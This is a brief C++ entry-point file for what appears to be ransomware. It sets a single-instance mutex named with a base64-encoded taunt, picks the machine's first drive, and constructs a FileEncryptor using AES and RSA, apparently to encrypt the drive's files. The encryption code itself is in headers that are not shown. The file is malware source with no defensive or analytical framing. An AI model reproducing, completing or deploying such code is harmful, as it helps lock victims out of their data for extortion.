#include <iostream>
#include <thread>

#include "headers.h"
#include "systeme.h"
#include "fileEncryptor.h"


int main(void) {

	HANDLE hMutex = CreateMutex(NULL, TRUE, L"b29wc2llIHRoYXRzIHNhZCBmb3IgeW91IF5e=");
	if (ERROR_ALREADY_EXISTS == GetLastError()) {
		return 1;
	}
	Systeme sys;

	std::string disk = sys.getDrives().at(0);

	FileEncryptor fileEncryptor(disk, (std::string)"AES", (std::string)"RSA");
	


	
	return 0;
}